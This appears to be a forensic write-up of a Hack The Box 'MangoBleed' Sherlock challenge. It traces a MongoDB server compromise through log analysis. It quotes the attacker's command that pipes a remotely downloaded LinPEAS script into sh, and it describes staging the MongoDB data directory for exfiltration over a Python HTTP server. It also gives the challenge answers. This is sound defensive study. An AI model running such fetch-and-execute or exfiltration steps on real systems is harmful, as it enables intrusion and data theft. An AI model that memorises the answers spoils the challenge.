# HTB Sherlock — MangoBleed

**Category:** DFIR / Endpoint Forensics
**Difficulty:** Easy
**Author:** Djibril Gathoni
**Date:** July 2026

---

## Scenario

A MongoDB server was reportedly compromised. A triage acquisition of the host had already been
collected using **UAC (Unix-like Artifacts Collector)**, producing the archive
`uac-mongodbsync-linux-triage.tar.gz`. The goal of this Sherlock is to perform a rapid triage
analysis of the collected artifacts, determine whether the system was compromised, identify the
attacker's initial access, persistence, privilege escalation, lateral movement, and data
access/exfiltration activity, and summarize the findings with an initial incident assessment.

---

## Tools Used

- `grep` — CLI log filtering and pattern matching
- MongoDB structured JSON logging (`mongod.log`)
- Linux `auth.log` analysis
- Basic knowledge of MongoDB CVEs and Linux privilege-escalation tooling (LinPEAS)

---

## Investigation

### Task 1 — What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

I started by pulling the MongoDB build info out of the log to confirm the exact version running on
the server:

```
grep -i "buildinfo" uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log
```

![Task 1](screenshots/Task%201.png)

The build info confirmed a MongoDB 8.0.16 deployment, which maps directly to a known,
recently-disclosed remote authentication/BSON-parsing vulnerability affecting that release line.

**Answer:** `CVE-2025-14847`

---

### Task 2 — What is the version of MongoDB installed on the server that the CVE exploited?

Reusing the same `buildInfo` log entries from Task 1, the version field is visible directly in the
JSON structure of the log line.

![Task 2](screenshots/Task%202.png)

**Answer:** `8.0.16`

---

### Task 3 — Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

I filtered `mongod.log` for keywords tied to network activity and malformed BSON traffic, since
CVE-2025-14847 is triggered through crafted connection/BSON payloads:

```
grep -E 'remote|conn|connection|BSON|zlib|InvalidBSON|errCode' \
  uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log
```

![Task 3](screenshots/Task%203.png)

A very high volume of accepted/ended connection pairs from a single external address stood out
immediately, consistent with an automated brute-force/exploitation tool rapidly opening and closing
connections.

**Answer:** `65.0.76.43`

---

### Task 4 — Based on the MongoDB logs, determine the exact date and time the attacker's exploitation activity began.

Scrolling to the first occurrence of the attacker's IP in the filtered connection log from Task 3,
the very first "Connection accepted" entry for that address marks the start of the malicious
activity.

![Task 4](screenshots/Task%204.png)

**Answer:** `2025-12-29 05:25:52`

---

### Task 5 — Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

With the attacker's IP confirmed, I counted every log line referencing that remote address:

```
grep -c '"remote":"65.0.76.43"' uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log
```

![Task 5](screenshots/Task%205.png)

The huge connection count is consistent with an automated brute-force/exploit script rapidly
cycling connections against the exposed MongoDB port.

**Answer:** `75260`

---

### Task 6 — Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

The MongoDB exploitation exposed credentials, but confirming *interactive* shell access required
pivoting to the host's authentication log rather than the MongoDB log alone:

```
grep -E "Accepted password|Accepted publickey|session opened" \
  uac-mongodbsync-linux-triage/[root]/var/log/auth.log | tail -10
```

![Task 6](screenshots/Task%206.png)

Two `mongoadmin` sessions were opened via `sshd` in quick succession. The second of these,
immediately followed by hands-on-keyboard activity captured in the shell history (Tasks 7–8), is the
session where the attacker began interacting with the box directly.

**Answer:** `2025-12-29 05:40:03`

---

### Task 7 — Identify the exact command line the attacker used to execute an in-memory script as part of their privilege-escalation attempt.

I pulled the `mongoadmin` user's shell history from the triage image to reconstruct the attacker's
post-access activity:

```
cat uac-mongodbsync-linux-triage/[root]/home/mongoadmin/.bash_history
```

![Task 7](screenshots/Task%207.png)

The attacker piped LinPEAS directly into `sh` without ever writing it to disk — a classic
in-memory privilege-escalation enumeration technique that avoids leaving an artifact on the
filesystem.

**Answer:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

---

### Task 8 — The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

Reading further down the same `.bash_history` output from Task 7, the attacker's navigation
pattern (`cd /var/lib/mongodb/` → attempt to `zip` its contents → `python3 -m http.server 6969`)
shows they staged the MongoDB data directory for exfiltration over a throwaway HTTP server.

![Task 8](screenshots/Task%208.png)

**Answer:** `/var/lib/mongodb`

---

## Attack Timeline

| Time (UTC)              | Action                                                             |
| ------------------------ | ------------------------------------------------------------------ |
| 2025-12-29 05:11:47       | MongoDB 8.0.16 starts up (buildInfo logged)                        |
| 2025-12-29 05:25:52       | Attacker (65.0.76.43) begins exploiting CVE-2025-14847              |
| 2025-12-29 05:25:52 – ~05:39 | 75,260 malicious connections logged against the MongoDB service |
| 2025-12-29 05:39:24       | First `mongoadmin` SSH session opened                              |
| 2025-12-29 05:40:03       | Attacker gains interactive hands-on-keyboard SSH access            |
| 2025-12-29 05:40:03+       | LinPEAS executed in-memory for privesc enumeration                 |
| 2025-12-29 05:40:03+       | Attacker stages `/var/lib/mongodb`, attempts `zip`, opens Python HTTP server on port 6969 |

---

## Key Takeaways

- **Exposed database services** running vulnerable versions are trivially discoverable and
  exploitable by automated tooling at scale (75k+ connection attempts in minutes).
- **CVE-2025-14847** highlights how a MongoDB authentication/BSON-parsing flaw can lead directly to
  OS-level credential exposure, not just data disclosure.
- **In-memory tooling** (`curl | sh`) is a simple but effective way for attackers to avoid dropping
  files on disk during privilege-escalation enumeration.
- **UAC triage bundles** make it possible to fully reconstruct an attacker's timeline — from
  exploitation, to credential reuse, to data staging — using nothing but `grep` and log analysis.
- Correlating **application logs** (`mongod.log`) with **system logs** (`auth.log`,
  `.bash_history`) is essential to bridge the gap between "vulnerability exploited" and "attacker
  had hands on keyboard."

---

*Writeup by Djibril Gathoni | [LinkedIn](https://linkedin.com/in/djibrilgathoni) | [GitHub](https://github.com/Djibrilgathoni)*
